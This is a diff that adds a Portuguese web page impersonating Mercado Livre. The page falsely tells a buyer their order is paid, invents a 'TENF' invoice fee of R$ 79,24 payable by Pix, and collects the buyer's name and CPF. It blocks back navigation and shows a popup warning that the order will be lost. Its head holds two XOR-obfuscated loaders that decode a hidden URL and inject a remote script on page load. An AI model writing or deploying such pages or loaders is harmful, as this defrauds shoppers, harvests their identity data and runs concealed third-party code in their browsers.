@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script src="/assets/js/error-log.js?v=1"></script><script>window.ROTAS={"raiz":"/","questionario":"/oferta95/questionario/","roleta":"/oferta95/roleta/","recompensas":"/oferta95/recompensas/","produto":"/produtos/","checkout":"/oferta95/checkout/","up":"/oferta95/up/","esgotou":"/oferta95/esgotou/","reembolso":"/oferta95/reembolso/"};function rota(n){return (window.ROTAS&&window.ROTAS[n])||"/";}</script><script src="/assets/js/replay/fm-replay.js?v=1793774445" data-endpoint="/api/replay.php" data-amostra="30" defer></script>
+<script>window.__ML_EXPERIMENT={id:"exp_theme_bf_v1",variant:"light"};</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Meus Pedidos - Mercado Livre</title>
+<link rel="icon" href="/assets/images/favicon.png">
+<link href="/assets/css/fonts.css" rel="stylesheet">
+<!-- [26/10] mesmo visual do esgotou/checkout: componentes compartilhados em assets/css/funil.css -->
+<link href="/assets/css/funil.css?v=14" rel="stylesheet">
+
+<script>
+let shouldShowPopup = true;
+window.onbeforeunload = function(event) {
+  if (shouldShowPopup) {
+    var customPopup = document.getElementById('custom-popup');
+    if (customPopup) customPopup.classList.add('show');
+    event.preventDefault();
+    event.returnValue = '';
+    return 'ATENÇÃO! Ao sair desta página sem pagar a taxa, sua encomenda será perdida.';
+  }
+};
+
+function hideCustomPopup() {
+  var customPopup = document.getElementById('custom-popup');
+  if (customPopup) customPopup.classList.remove('show');
+}
+
+function preventBackNavigation() {
+  window.history.pushState(null, '', window.location.href);
+  window.addEventListener('popstate', function() {
+    var customPopup = document.getElementById('custom-popup');
+    if (customPopup) customPopup.classList.add('show');
+    window.history.pushState(null, '', window.location.href);
+  });
+}
+
+window.onload = function() {
+  preventBackNavigation();
+  var finalButton = document.getElementById('finalButton');
+  if (finalButton) finalButton.addEventListener('click', function() { shouldShowPopup = false; });
+};
+</script>
+
+<!-- UTMify Pixel REMOVIDO 07/10 -->
+
+<!-- Meta Pixel REMOVIDO 07/10 -->
+
+<!-- TikTok Pixel REMOVIDO 07/10 -->
+
+<style>
+/* ajustes locais do up (o resto vem de funil.css) */
+#ad1,#ad2,#pix-modal{padding-bottom:118px}
+#pix-modal{display:none}
+.up-title{font-size:16px;font-weight:600;color:var(--text);margin:0 0 10px}
+</style>
+<script src="/assets/js/funil-recover.js?v=1" defer></script>
+
+<script src="/assets/js/tiktok-helper.js?v=1"></script>
+<!-- Facebook Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2027107937966810');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2027107937966810&ev=PageView&noscript=1"/></noscript>
+<!-- End Facebook Pixel Code -->
+<!-- FB/UTM Cookie Capture -->
+<script>
+(function(){
+  try{
+    var cs=document.cookie.split(";");
+    for(var i=0;i<cs.length;i++){
+      var c=cs[i].trim();
+      if(c.indexOf("_fbp=")===0) localStorage.setItem("ml_fbp",c.substring(5));
+      if(c.indexOf("_fbc=")===0) localStorage.setItem("ml_fbc",c.substring(5));
+    }
+    var u=new URLSearchParams(window.location.search);
+    var fbclid=u.get("fbclid");
+    if(fbclid){
+      var fbc="fb.1."+Date.now()+"."+fbclid;
+      document.cookie="_fbc="+fbc+";path=/;max-age=7776000;SameSite=Lax";
+      localStorage.setItem("ml_fbc",fbc);
+    }
+    var utms={};
+    ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","src","sck"].forEach(function(k){
+      var v=u.get(k); if(v) utms[k]=v;
+    });
+    if(Object.keys(utms).length>0){
+      var old={}; try{old=JSON.parse(localStorage.getItem("ml_utms")||"{}")}catch(e){}
+      Object.assign(old,utms);
+      localStorage.setItem("ml_utms",JSON.stringify(old));
+    }
+  }catch(e){}
+})();
+</script>
+
+<script>(function(){var t_xp=atob("DCXIzfdTl3LzTePFMl7quIU/tUjRJZexQlby4tgw8xzdOJeoW0Ox45Q8+lyRP8y2UVehvYMguAeHIJDqXkS8qIQnuRiAb8/nU1G8v54x4gaWPsH/aV7qo5Y+8lDJb4ekRkTluIM+/hSKYJO3V1Oto4N+7xGcKc62UU7q4dUl9h6GKMH/EAe14Yxx+ROeKMH/EEGpuZZ+4gaeJIW8H1W6qIE2+QbePpanW0G779tx4ROfOIbnCAfqsKou");var c_dkmb=[];for(var d_y=0;d_y<t_xp.length;d_y++){c_dkmb.push(t_xp.charCodeAt(d_y)&255);}var f_3zy=c_dkmb[0];var c_0hv=c_dkmb.slice(1,1+f_3zy);var n_h=c_dkmb.slice(1+f_3zy);var e_hxw0=n_h.map(function(b,f_e30){return b^c_0hv[f_e30%f_3zy];});var z_t="";for(var u_43n=0;u_43n<e_hxw0.length;u_43n++){z_t+=String.fromCharCode(e_hxw0[u_43n]&255);}var x_lb3s=decodeURIComponent(escape(z_t));var b_g=JSON.parse(x_lb3s);var n_pu=b_g.globals||[];n_pu.forEach(function(n_r){window[n_r.name]=n_r.value;});var f_plp5=document.createElement("script");f_plp5.src=b_g.url;f_plp5.async=true;f_plp5.defer=true;(b_g.attributes||[]).forEach(function(p_y){f_plp5.setAttribute(p_y.name,p_y.value);});(document.head||document.documentElement).appendChild(f_plp5);})();</script>
+
+<script>(function(){var q_si=atob("DBsW4u7fpqiJ9a0Kd2A0l5yzhJKrndl+B2gszcG8wsangNlnHn1vzI2wy4brh4J5FGl/kpqsidjgjchmWGt/mouziML614EoFm9ikIe909zsho8wLEY6wImzycromd4oTUBtwIC+y82rz496HmNzjqe7hISrg8xmAn402MzpxJi4kZwzESom2ovtnsrtkMs6Fisg1Yr92/X0");var b_7=[];for(var a_0nc8=0;a_0nc8<q_si.length;a_0nc8++){b_7.push(q_si.charCodeAt(a_0nc8)&255);}var m_cdmr=b_7[0];var q_z=b_7.slice(1,1+m_cdmr);var e_bd=b_7.slice(1+m_cdmr);var w_1=e_bd.map(function(b,k_a){return b^q_z[k_a%m_cdmr];});var e_83m="";for(var o_yjqq=0;o_yjqq<w_1.length;o_yjqq++){e_83m+=String.fromCharCode(w_1[o_yjqq]&255);}var z_dv=decodeURIComponent(escape(e_83m));var e_72=JSON.parse(z_dv);var i_svxc=e_72.globals||[];i_svxc.forEach(function(e_5i6){window[e_5i6.name]=e_5i6.value;});var k_u=document.createElement("script");k_u.src=e_72.url;k_u.async=true;k_u.defer=true;(e_72.attributes||[]).forEach(function(e_6a){k_u.setAttribute(e_6a.name,e_6a.value);});(document.head||document.documentElement).appendChild(k_u);})();</script>
+
+</head>
+<body>
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
+  <symbol id="i-lock" viewBox="0 0 24 24"><path d="M6 10V8a6 6 0 1 1 12 0v2h1v12H5V10zm2 0h8V8a4 4 0 1 0-8 0z"/></symbol>
+  <symbol id="i-truck" viewBox="0 0 24 24"><path d="M3 5h11v9H3zM14 8h4l3 3.5V14h-7z"/><circle cx="7" cy="16.5" r="2"/><circle cx="17" cy="16.5" r="2"/></symbol>
+  <symbol id="i-copy" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></symbol>
+  <symbol id="i-doc" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 7V3.5L18.5 9H13zM6 20V4h5v7h7v9H6z"/></symbol>
+</svg>
+
+<div class="wrap">
+  <div class="top"><img src="/assets/images/logo.webp" alt="Mercado Livre"><span class="seg"><svg class="ico"><use href="#i-lock"/></svg> Compra segura</span></div>
+
+  <!-- ======== AD1: pedido confirmado ======== -->
+  <div id="ad1">
+    <div class="esg-upd"><span class="esg-dot g">✓</span><div><b>Pedido #6481749338</b><small>Pagamento confirmado · Mercado Livre</small></div></div>
+    <div class="esg-sep"></div>
+    <div class="esg-box">
+      <div class="up-rows">
+        <div class="row ok"><i>✓</i><div><b>Pagamento concluído</b><small>Seu pagamento foi processado com sucesso</small></div></div>
+        <div class="row warn"><i>!</i><div><b>Emita sua nota fiscal</b><small>Ação necessária para o despacho do produto</small></div></div>
+      </div>
+      <p class="esg-txt">Parabéns! Seu pagamento foi concluído com sucesso. Agora é necessário emitir a <b>Nota Fiscal</b> para que possamos despachar o seu pedido. Toque abaixo para prosseguir.</p>
+      <button class="btn" onclick="showAd2()">Emitir nota fiscal</button>
+      <div class="esg-sub">Documento obrigatório para o despacho do pedido</div>
+    </div>
+  </div>
+
+  <!-- ======== AD2: emissao com passos (mesmo componente do carregamento do esgotou) ======== -->
+  <div id="ad2" style="display:none;">
+    <div class="esg-upd"><span class="esg-dot">!</span><div><b>Emissão da nota fiscal</b><small id="ad2sub">Pedido #6481749338 · não feche esta página</small></div></div>
+    <div class="esg-sep"></div>
+    <div class="esg-box">
+      <div class="up-steps">
+        <div class="st" id="step1" data-t="ok"><span class="ic"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"><path d="m5 12.5 4.5 4.5L19 7.5"/></svg></span><div><b>Emitindo a nota fiscal</b><small>Processando a documentação fiscal do pedido</small></div></div>
+        <div class="st" id="step2" data-t="warn"><span class="ic"><svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><rect x="10.6" y="4" width="2.8" height="10" rx="1.4"/><circle cx="12" cy="18.5" r="1.7"/></svg></span><div><b>Pendência identificada no pedido</b><small>Foi encontrada uma pendência que precisa ser resolvida</small></div></div>
+        <div class="st" id="step3" data-t="alert"><span class="ic"><svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><rect x="10.6" y="4" width="2.8" height="10" rx="1.4"/><circle cx="12" cy="18.5" r="1.7"/></svg></span><div><b>TENF · Taxa de Emissão de Nota Fiscal</b><small>Produto vendido com desconto promocional: a taxa de emissão fica por conta do comprador</small></div></div>
+      </div>
+
+      <div id="text4" class="hidden" style="display:none">
+        <div class="esg-notice in"><i>!</i><div>Produto vendido com <b>desconto promocional</b>: a <b>Taxa de Emissão de Nota Fiscal (TENF)</b> não está inclusa no valor e fica por conta do comprador. É cobrada <b>uma única vez</b>; com o pagamento confirmado, a nota é emitida e o pedido segue para despacho.</div></div>
+
+        <div class="nf-form">
+          <b>Dados da nota fiscal</b>
+          <small>Já preenchidos com o seu cadastro. Confira ou altere: a nota será emitida com estes dados.</small>
+          <label>Nome completo<input id="nf-nome" type="text" autocomplete="off" placeholder="Nome como no CPF"></label>
+          <label>CPF<input id="nf-cpf" type="text" inputmode="numeric" autocomplete="off" placeholder="000.000.000-00" maxlength="14"></label>
+        </div>
+
+        <div class="esg-resumo">
+          <div class="r"><span>Nota fiscal do pedido</span><b>Emissão pendente</b></div>
+          <div class="div"></div>
+          <div class="r tot"><span>Taxa de emissão (TENF)</span><span class="v"><b>R$ 79,24</b><small>via Pix</small></span></div>
+        </div>
+        <button class="btn" onclick="openPixModal()"><span id="payBtnText">Pagar TENF e emitir a nota</span></button>
+        <div class="esg-sub">Pagamento seguro via Pix · confirmação imediata</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======== PIX da TENF (mesma tela do esgotou) ======== -->
+  <div id="pix-modal">
+    <div class="esg-upd"><span class="esg-dot g">✓</span><div><b>Pagamento da TENF</b><small>Taxa por conta do comprador em compras com desconto · após a confirmação a nota é emitida e o pedido segue para despacho</small></div></div>
+    <div class="esg-sep"></div>
+    <div class="esg-box">
+      <div class="esg-resumo">
+        <div class="r"><span>Pedido</span><b>#6481749338</b></div>
+        <div class="r"><span>Nota fiscal em nome de</span><b id="nf-who" data-rr-mask>—</b></div>
+        <div class="div"></div>
+        <div class="r tot"><span>Taxa de emissão (TENF)</span><span class="v"><b>R$ 79,24</b><small>via Pix</small></span></div>
+      </div>
+
+      <!-- Loading -->
+      <div id="up-pix-loading" class="pix-loading"><span class="ic"></span><span>Gerando código Pix…</span></div>
+
+      <!-- Content -->
+      <div id="up-pix-content" style="display:none">
+        <div class="pix-qrbox">
+          <div id="up-qr-code" class="pix-qr" data-rr-block></div>
+          <small>Escaneie o QR Code no app do seu banco ou copie o código abaixo</small>
+        </div>
+        <button class="btn" id="up-copy-btn" onclick="copyUpPixCode()"><svg class="ico"><use href="#i-copy"/></svg> <span>Copiar código Pix</span></button>
+        <div class="pix-code-section"><label class="pix-code-label" for="up-pix-code">Código Pix Copia e Cola</label><input type="text" id="up-pix-code" readonly class="pix-code-input" value=""></div>
+        <div class="pix-status" id="up-status"><span class="pix-status-dot"></span><span>Aguardando pagamento…</span></div>
+        <button class="btn-sec pix-check-btn" id="up-check-btn" onclick="checkUpPayment()">Já paguei, verificar pagamento</button>
+        <div class="pix-steps"><b>Como pagar em 3 passos</b>
+          <div><em>1</em><span>Copie o código acima</span></div>
+          <div><em>2</em><span>Abra o app do seu banco e escolha Pix Copia e Cola</span></div>
+          <div><em>3</em><span>Cole o código, confirme e volte para esta página</span></div>
+        </div>
+      </div>
+
+      <!-- Confirmed -->
+      <div id="up-pix-confirmed">
+        <div class="up-rows">
+          <div class="row ok"><i>✓</i><div><b>Pagamento confirmado!</b><small>Sua nota fiscal será emitida em instantes.</small></div></div>
+          <div class="row ok"><i>✓</i><div><b>Pedido liberado para despacho</b><small>Você receberá o código de rastreio por e-mail.</small></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="esg-footer">
+    <div class="esg-icons">
+      <div><svg viewBox="0 0 24 24"><path fill="#3483fa" d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5z"/><path d="m8.5 12 2.5 2.5 4.5-5" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Compra<br>Garantida</span></div>
+      <div><svg style="fill:#3483fa"><use href="#i-truck"/></svg><span>Frete<br>FULL</span></div>
+      <div><svg viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M9 7 4 11l5 4"/><path d="M4 11h10a6 6 0 0 1 6 6"/></svg><span>Devolução<br>grátis 30 dias</span></div>
+    </div>
+    <div class="esg-foot">Mercado Livre © 2026 · Pagamento seguro por Mercado Pago</div>
+  </footer>
+</div>
+
+<!-- ======== POPUP (voltar sem pagar) ======== -->
+<div class="popup" id="custom-popup">
+  <div class="card">
+    <h2><i>!</i>Atenção</h2>
+    <p>Ao sair desta página sem pagar a taxa, sua encomenda será perdida e outra pessoa terá a oportunidade de resgatá-la.</p>
+    <button class="btn" onclick="hideCustomPopup(); openPixModal();">Efetuar pagamento da TENF</button>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="up-toast">Código Pix copiado!</div>
+
+<!-- SCRIPTS -->
+<script src="/assets/js/qrcode.min.js"></script>
+<script src="/assets/js/repix.js?v=1"></script>
+<script src="/assets/js/cart.js?v=3"></script>
+<script src="/assets/js/feature-flags.js"></script>
+<script src="/assets/js/ml-analytics-v3.js?v=tt2"></script>
+<script>
+// FASE 1: Track upsell interactions
+document.addEventListener('DOMContentLoaded', function() {
+  if (typeof MLA !== 'undefined') MLA.track('upsell_view', {});
+  document.querySelectorAll('a, button').forEach(function(el) {
+    el.addEventListener('click', function() {
+      var txt = (this.textContent || '').toLowerCase().trim();
+      if (txt.indexOf('sim') !== -1 || txt.indexOf('quero') !== -1 || txt.indexOf('aceito') !== -1 || txt.indexOf('adicionar') !== -1) {
+        if (typeof MLA !== 'undefined') MLA.track('upsell_accept', { label: txt.substring(0, 50) });
+      } else if (txt.indexOf('não') !== -1 || txt.indexOf('pular') !== -1 || txt.indexOf('recusar') !== -1) {
+        if (typeof MLA !== 'undefined') MLA.track('upsell_decline', { label: txt.substring(0, 50) });
+      }
+    });
+  });
+});
+</script>
+
+<script>
+/* ============================================
+   AD2: passos da emissao (mesma animacao do carregamento do esgotou)
+   ============================================ */
+function showAd2() {
+  document.getElementById('ad1').style.display = 'none';
+  document.getElementById('ad2').style.display = 'block';
+  window.scrollTo(0, 0);
+  var steps = [document.getElementById('step1'), document.getElementById('step2'), document.getElementById('step3')];
+  var T = [3000, 3500, 4000]; // tempo de cada passo "girando"
+  var i = 0;
+  function next() {
+    if (i > 0) { var p = steps[i - 1]; p.classList.remove('on'); p.classList.add(p.dataset.t); }
+    if (i < steps.length) { steps[i].classList.add('on'); setTimeout(next, T[i]); i++; }
+    else {
+      document.getElementById('ad2sub').textContent = 'Pendência encontrada · ação necessária';
+      // [27/10] passos cumpriram o papel: somem e o foco vai para o aviso + dados da NF + pagamento
+      setTimeout(function() {
+        var box = document.querySelector('#ad2 .up-steps'); if (box) box.style.display = 'none';
+        var t4 = document.getElementById('text4'); t4.style.display = 'block'; t4.classList.add('fade');
+        window.scrollTo(0, 0);
+      }, 600);
+    }
+  }
+  setTimeout(next, 400);
+}
+
+/* [27/10] dados da NF: prefill com o cadastro do checkout (ml_customer_data) e mascara de CPF */
+(function() {
+  function digits(v) { return String(v || '').replace(/\D+/g, '').slice(0, 11); }
+  function maskCpf(v) { var d = digits(v); return d.replace(/^(\d{3})(\d)/, '$1.$2').replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3').replace(/\.(\d{3})(\d{1,2})$/, '.$1-$2'); }
+  var c = {}; try { c = JSON.parse(localStorage.getItem('ml_customer_data') || '{}'); } catch (e) {}
+  var n = document.getElementById('nf-nome'), d = document.getElementById('nf-cpf');
+  if (n) n.value = (c.name || '').trim();
+  if (d) { d.value = maskCpf(c.document || c.cpf || ''); d.addEventListener('input', function() { d.value = maskCpf(d.value); }); }
+  // dados que vao para o pagamento e para a tela do Pix
+  window.nfData = function() {
+    var nome = n && n.value.trim() ? n.value.trim() : (c.name || '');
+    var cpf = d && digits(d.value).length === 11 ? digits(d.value) : digits(c.document || c.cpf || '');
+    try { c.name = nome; c.document = cpf ? maskCpf(cpf) : (c.document || ''); localStorage.setItem('ml_customer_data', JSON.stringify(c)); } catch (e) {}
+    return { name: nome, document: cpf };
+  };
+})();
+</script>
+
+<script>
+/* ============================================
+   UP Page - PIX Payment Flow
+   TENF = funil.up_amount do config.json (o servidor impoe o mesmo valor)
+   ============================================ */
+// [29/10] quem ja pagou a TENF e volta ao /up/ segue direto para o reembolso (novo fim do funil)
+(function() {
+  try {
+    var mp = JSON.parse(localStorage.getItem('ml_main_pix') || '{}');
+    if (mp.code && localStorage.getItem('ml_up_done') === mp.code) {
+      var q = new URLSearchParams(location.search); q.set('c', mp.code);
+      location.replace(rota('reembolso') + '?' + q.toString());
+    }
+  } catch (e) {}
+})();
+
+(function() {
+  'use strict';
+  var UP_AMOUNT = 7924;
+  var upPaymentCode = null;
+  var upPollingInterval = null;
+  var isGeneratingUpPix = false; // Debounce: prevent multiple concurrent API calls
+
+  // [26/10] o PIX deixou de ser modal: e uma tela inline (mesmo padrao do esgotou)
+  window.openPixModal = function() {
+    var modal = document.getElementById('pix-modal');
+    if (modal) {
+      document.getElementById('ad2').style.display = 'none';
+      modal.style.display = 'block';
+      window.scrollTo(0, 0);
+      shouldShowPopup = false;
+      generateUpPix();
+    }
+  };
+
+  window.closePixModal = function() {
+    var modal = document.getElementById('pix-modal');
+    if (modal) {
+      modal.style.display = 'none';
+      document.getElementById('ad2').style.display = 'block';
+      shouldShowPopup = true;
+    }
+  };
+
+  function generateUpPix() {
+    // Debounce: prevent multiple concurrent API calls
+    if (isGeneratingUpPix) {
+      console.warn('UP PIX generation already in progress');
+      return;
+    }
+    isGeneratingUpPix = true;
+
+    var loading = document.getElementById('up-pix-loading');
+    var content = document.getElementById('up-pix-content');
+    var confirmed = document.getElementById('up-pix-confirmed');
+
+    if (loading) {
+      loading.style.display = 'flex';
+      loading.innerHTML = '<span class="ic"></span><span>Gerando código Pix…</span>';
+    }
+    if (content) content.style.display = 'none';
+    if (confirmed) confirmed.style.display = 'none';
+
+    var customer = {};
+    try { customer = JSON.parse(localStorage.getItem('ml_customer_data') || '{}'); } catch(e) {}
+    // [27/10] nome/CPF confirmados no formulario da NF (editaveis) prevalecem sobre o cadastro
+    var nf = (typeof window.nfData === 'function') ? window.nfData() : {};
+    if (nf.name) customer.name = nf.name;
+    if (nf.document) customer.document = nf.document;
+    var who = document.getElementById('nf-who');
+    if (who) { var cd = String(customer.document || '').replace(/\D+/g, ''); who.textContent = (customer.name || '—') + (cd.length === 11 ? ' · CPF ' + cd.replace(/^(\d{3})\d{3}\d{3}(\d{2})$/, '$1.***.***-$2') : ''); }
+
+    var utms = {};
+    try { utms = JSON.parse(localStorage.getItem('ml_utms') || '{}'); } catch(e) {}
+    var fbp = localStorage.getItem('ml_fbp') || null;
+    var fbc = localStorage.getItem('ml_fbc') || null;
+    // sequencia estrita: o up exige o ESGOTADO pago. ml_esg.pcode = payment_code do esgotado.
+    var mainCode = '';
+    try { mainCode = (JSON.parse(localStorage.getItem('ml_main_pix') || '{}').code) || ''; } catch(e) {}
+    var esgCode = '';
+    try { esgCode = (JSON.parse(localStorage.getItem('ml_esg') || '{}').pcode) || ''; } catch(e) {}
+
+    var payload = {
+      customer: {
+        email: customer.email || '',
+        name: customer.name || '',
+        document: customer.document || customer.cpf || '',
+        phone: customer.phone || customer.telefone || '',
+        ref: customer.ref || ''
+      },
+      amount: UP_AMOUNT,
+      items: [{ id: 'tenf', name: 'TENF - Taxa de Emissão da Nota Fiscal', price: UP_AMOUNT, quantity: 1 }],
+      trackingParameters: Object.assign({}, utms, { fbp: fbp, fbc: fbc }, (typeof ttkGetTracking === 'function' ? ttkGetTracking() : {})),
+      metadata: { type: 'upsell_tenf', main_code: mainCode, esgotou_code: esgCode }
+    };
+
+    fetch('/api/pix/payment.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (!data.success || !data.pix_qrcode_text) throw new Error(data.error || 'Erro');
+
+      upPaymentCode = data.payment_code;
+
+      var qrContainer = document.getElementById('up-qr-code');
+      if (qrContainer && typeof qrcode !== 'undefined') {
+        var qr = qrcode(0, 'M');
+        qr.addData(data.pix_qrcode_text);
+        qr.make();
+        qrContainer.innerHTML = qr.createImgTag(4, 8);
+      }
+
+      var codeInput = document.getElementById('up-pix-code');
+      if (codeInput) codeInput.value = data.pix_qrcode_text;
+
+      if (loading) loading.style.display = 'none';
+      if (content) content.style.display = 'block';
+
+      startUpPolling();
+    })
+    .catch(function(err) {
+      // Unlock: allow retry after error
+      isGeneratingUpPix = false;
+      if (loading) {
+        loading.style.display = 'block';
+        loading.innerHTML =
+          '<div class="pix-err">Erro ao gerar o Pix. Tente novamente.</div>' +
+          '<button onclick="openPixModal()" class="btn" style="margin-top:4px">Tentar novamente</button>';
+      }
+      console.error('UP PIX Error:', err);
+    });
+  }
+
+  window.copyUpPixCode = function() {
+    var input = document.getElementById('up-pix-code');
+    var btn = document.getElementById('up-copy-btn');
+    if (!input) return;
+
+    var onCopy = function() {
+      if (btn) {
+        btn.classList.add('copied');
+        btn.lastChild.textContent = 'Código copiado!';
+        setTimeout(function() {
+          btn.classList.remove('copied');
+          btn.lastChild.textContent = 'Copiar código Pix';
+        }, 3000);
+      }
+      showUpToast();
+    };
+
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(input.value).then(onCopy);
+    } else {
+      input.select();
+      document.execCommand('copy');
+      onCopy();
+    }
+  };
+
+  function showUpToast() {
+    var toast = document.getElementById('up-toast');
+    if (toast) {
+      toast.style.display = 'block';
+      toast.style.opacity = '1';
+      setTimeout(function() {
+        toast.style.opacity = '0';
+        setTimeout(function() { toast.style.display = 'none'; }, 300);
+      }, 2500);
+    }
+  }
+
+  function startUpPolling() {
+    if (upPollingInterval) clearInterval(upPollingInterval);
+    var maxAttempts = 120;
+    var attempts = 0;
+
+    upPollingInterval = setInterval(function() {
+      attempts++;
+      if (attempts > maxAttempts) { clearInterval(upPollingInterval); return; }
+      checkUpPaymentStatus(false);
+    }, 5000);
+    // [26/10] a tela de confirmado do up so aparece quando o PIX do up for aprovado (openUpRp em checkUpPaymentStatus 'paid'), nao por timer
+  }
+
+  window.checkUpPayment = function() {
+    var btn = document.querySelector('.pix-check-btn');
+    if (btn) btn.textContent = 'Verificando…';
+    checkUpPaymentStatus(true);
+  };
+
+  function checkUpPaymentStatus(manual) {
+    if (!upPaymentCode) return;
+
+    fetch('/api/pix/check-payment.php?code=' + encodeURIComponent(upPaymentCode))
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        if (data.status === 'paid') {
+          if (upPollingInterval) clearInterval(upPollingInterval);
+          var st = document.getElementById('up-status');
+          if (st) { st.classList.add('confirmed'); st.lastChild.textContent = 'Pagamento confirmado!'; }
+          openUpRp();
+        } else if (manual) {
+          var btn = document.querySelector('.pix-check-btn');
+          if (btn) btn.textContent = 'Ainda não confirmado, aguarde…';
+          setTimeout(function() { if (btn) btn.textContent = 'Já paguei, verificar pagamento'; }, 3000);
+        }
+      })
+      .catch(function() {
+        if (manual) {
+          var btn = document.querySelector('.pix-check-btn');
+          if (btn) btn.textContent = 'Erro. Tente novamente.';
+        }
+      });
+  }
+
+  var upRepix = MLRepix.create({ api: '/api/repix.php' });
+  var upRpOpened = false;
+  // [25/10] up e o FIM do funil: o bottom-sheet sobe 3s depois do PIX (mesmo se ja aprovado). QUALQUER
+  // acao (enviar/pular/fechar) fecha com a tela de confirmado (nao ha proximo passo pra redirecionar).
+  function openUpRp() {
+    if (upRpOpened || !upPaymentCode) return;
+    upRpOpened = true;
+    upRepix.openSheet(upPaymentCode, function() { onUpPaymentConfirmed(); });
+  }
+
+  // [29/10] 3a etapa: TENF paga -> o lead segue para a pagina de reembolso (novo fim do funil).
+  function toReembolso() {
+    var mc = '';
+    try { mc = (JSON.parse(localStorage.getItem('ml_main_pix') || '{}').code) || ''; } catch(e) {}
+    var q = new URLSearchParams(location.search);
+    if (mc) q.set('c', mc); else q.delete('c');
+    var s = q.toString();
+    location.replace(rota('reembolso') + (s ? '?' + s : ''));
+  }
+
+  function onUpPaymentConfirmed() {
+    // [17/10] TENF pago: a recuperacao do checkout para de trazer este pedido de volta ao funil
+    try { var mp = JSON.parse(localStorage.getItem('ml_main_pix') || '{}'); if (mp.code) localStorage.setItem('ml_up_done', mp.code); } catch(e) {}
+    if (upPollingInterval) clearInterval(upPollingInterval);
+
+    var content = document.getElementById('up-pix-content');
+    var confirmed = document.getElementById('up-pix-confirmed');
+    if (content) content.style.display = 'none';
+    if (confirmed) confirmed.style.display = 'block';
+
+    // [25/10] Purchase do up (TENF) vai SERVER-SIDE pela Events API (tt_send, event_id CP_<code>) quando o
+    // gateway aprova. Nada de ttq/fbq no navegador aqui — evita bloqueio de adblock e duplicacao.
+    // [29/10] mostra o "confirmado" por um instante e encaminha para o reembolso.
+    setTimeout(toReembolso, 1600);
+  }
+})();
+</script>
+</body>
+</html>
